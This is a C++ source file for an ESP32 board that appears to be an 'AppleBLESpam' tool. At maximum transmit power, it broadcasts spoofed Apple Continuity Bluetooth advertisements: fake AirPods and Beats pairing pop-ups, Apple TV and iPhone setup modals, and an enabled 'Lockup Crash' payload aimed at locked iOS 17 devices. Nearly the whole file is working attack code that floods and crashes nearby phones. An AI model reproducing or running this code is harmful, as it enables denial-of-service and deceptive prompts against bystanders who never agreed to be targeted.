#include <NimBLEDevice.h>
#include "continuity.h"

#define ADV_INTERVAL_MS 20

static const char *TAG = "AppleBLESpam";

typedef struct
{
    const char *title;
    const char *text;
    bool random;
    ContinuityMsg msg;
} Payload;

static Payload payloads[] = {
#if false
    {.title = "AirDrop",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeAirDrop,
             .data = {.airdrop = {}},
         }},
    {.title = "Airplay Target",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeAirplayTarget,
             .data = {.airplay_target = {}},
         }},
    {.title = "Handoff",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeHandoff,
             .data = {.handoff = {}},
         }},
    {.title = "Tethering Source",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeTetheringSource,
             .data = {.tethering_source = {}},
         }},
    {.title = "Mobile Backup",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x04}},
         }},
    {.title = "Watch Setup",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x05}},
         }},
    {.title = "Internet Relay",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x07}},
         }},
    {.title = "WiFi Password",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x08}},
         }},
    {.title = "Repair",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x0A}},
         }},
    {.title = "Apple Pay",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x0C}},
         }},
    {.title = "Developer Tools Pairing Request",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x0E}},
         }},
    {.title = "Answered Call",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x0F}},
         }},
    {.title = "Ended Call",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x10}},
         }},
    {.title = "DD Ping",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x11}},
         }},
    {.title = "DD Pong",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x12}},
         }},
    {.title = "Companion Link Proximity",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x14}},
         }},
    {.title = "Remote Management",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x15}},
         }},
    {.title = "Remote Auto Fill Pong",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x16}},
         }},
    {.title = "Remote Display",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x17}},
         }},
    {.title = "Nearby Info",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyInfo,
             .data = {.nearby_info = {}},
         }},
#endif
    {.title = "Lockup Crash",
     .text = "iOS 17, locked, long range",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeCustomCrash,
             .data = {.custom_crash = {}},
         }},
    {.title = "Random Action",
     .text = "Spam shuffle Nearby Actions",
     .random = true,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x00}},
         }},
    {.title = "Random Pair",
     .text = "Spam shuffle Proximity Pairs",
     .random = true,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x00, .model = 0x0000}},
         }},
    {.title = "AppleTV AutoFill",
     .text = "Banner, unlocked, long range",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x13}},
         }},
    {.title = "AppleTV Connecting...",
     .text = "Modal, unlocked, long range",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x27}},
         }},
    {.title = "Join This AppleTV?",
     .text = "Modal, unlocked, spammy",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xBF, .type = 0x20}},
         }},
    {.title = "AppleTV Audio Sync",
     .text = "Banner, locked, long range",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x19}},
         }},
    {.title = "AppleTV Color Balance",
     .text = "Banner, locked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x1E}},
         }},
    {.title = "Setup New iPhone",
     .text = "Modal, locked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x09}},
         }},
    {.title = "Setup New Random",
     .text = "Modal, locked, glitched",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0x40, .type = 0x09}},
         }},
    {.title = "Transfer Phone Number",
     .text = "Modal, locked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x02}},
         }},
    {.title = "HomePod Setup",
     .text = "Modal, unlocked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x0B}},
         }},
    {.title = "AirPods Pro",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0E20}},
         }},
    {.title = "Beats Solo 3",
     .text = "Modal, spammy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0620}},
         }},
    {.title = "AirPods Max",
     .text = "Modal, laggy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0A20}},
         }},
    {.title = "Beats Flex",
     .text = "Modal, laggy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1020}},
         }},
    {.title = "Airtag",
     .text = "Modal, unlocked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x05, .model = 0x0055}},
         }},
    {.title = "Hermes Airtag",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x05, .model = 0x0030}},
         }},
    {.title = "Setup New AppleTV",
     .text = "Modal, unlocked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x01}},
         }},
    {.title = "Pair AppleTV",
     .text = "Modal, unlocked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x06}},
         }},
    {.title = "HomeKit AppleTV Setup",
     .text = "Modal, unlocked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x0D}},
         }},
    {.title = "AppleID for AppleTV?",
     .text = "Modal, unlocked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x2B}},
         }},
    {.title = "AirPods",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0220}},
         }},
    {.title = "AirPods 2nd Gen",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0F20}},
         }},
    {.title = "AirPods 3rd Gen",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1320}},
         }},
    {.title = "AirPods Pro 2nd Gen",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1420}},
         }},
    {.title = "Powerbeats 3",
     .text = "Modal, spammy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0320}},
         }},
    {.title = "Powerbeats Pro",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0B20}},
         }},
    {.title = "Beats Solo Pro",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0C20}},
         }},
    {.title = "Beats Studio Buds",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1120}},
         }},
    {.title = "Beats X",
     .text = "Modal, spammy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0520}},
         }},
    {.title = "Beats Studio 3",
     .text = "Modal, spammy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0920}},
         }},
    {.title = "Beats Studio Pro",
     .text = "Modal, spammy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1720}},
         }},
    {.title = "Beats Fit Pro",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1220}},
         }},
    {.title = "Beats Studio Buds+",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1620}},
         }},

};

#define PAYLOAD_COUNT (sizeof(payloads) / sizeof(payloads[0]))

NimBLEAdvertising *pAdvertising;
uint8_t adv_data[31];
uint8_t adv_data_len = 0;

void set_adv_data(Payload *payload) {
    ContinuityMsg *msg = &payload->msg;
    if (payload->random) {
        msg->data.nearby_action.type = rand() % 0xFF;
    }

    adv_data_len = continuity_get_packet_size(msg->type);
    if (adv_data_len > sizeof(adv_data)) {
        Serial.printf("[%s] Advertisement data too large\n", TAG);
        return;
    }

    continuity_generate_packet(msg, adv_data);

    Serial.printf("[%s] Adv Data (%s): ", TAG, payload->title);
    for (uint8_t i = 0; i < adv_data_len; i++) {
        Serial.printf("%02X ", adv_data[i]);
    }
    Serial.println();

    NimBLEAdvertisementData advData;
    advData.setManufacturerData(std::string((char*)adv_data, adv_data_len));
    pAdvertising->setAdvertisementData(advData);
}

void setup() {
    Serial.begin(115200);
    Serial.printf("[%s] Initializing BLE\n", TAG);

    NimBLEDevice::init("AppleBLESpam");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9); // Max power

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9); //Not sure if this works with NimBLE
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN ,ESP_PWR_LVL_P9);

    pAdvertising = NimBLEDevice::getAdvertising();
    pAdvertising->setMinInterval(32); // 20ms
    pAdvertising->setMaxInterval(32);
    //pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);

    randomSeed(analogRead(0));
    Serial.printf("[%s] BLE Initialized, starting advertisements\n", TAG);
}

void loop() {
    static int payload_index = 0;

    Payload *payload = &payloads[payload_index];
    Serial.printf("[%s] Sending: %s - %s\n", TAG, payload->title, payload->text);

    set_adv_data(payload);
    pAdvertising->start();
    delay(ADV_INTERVAL_MS);

    pAdvertising->stop();
    delay(10);

    payload_index = (payload_index + 1) % PAYLOAD_COUNT;
}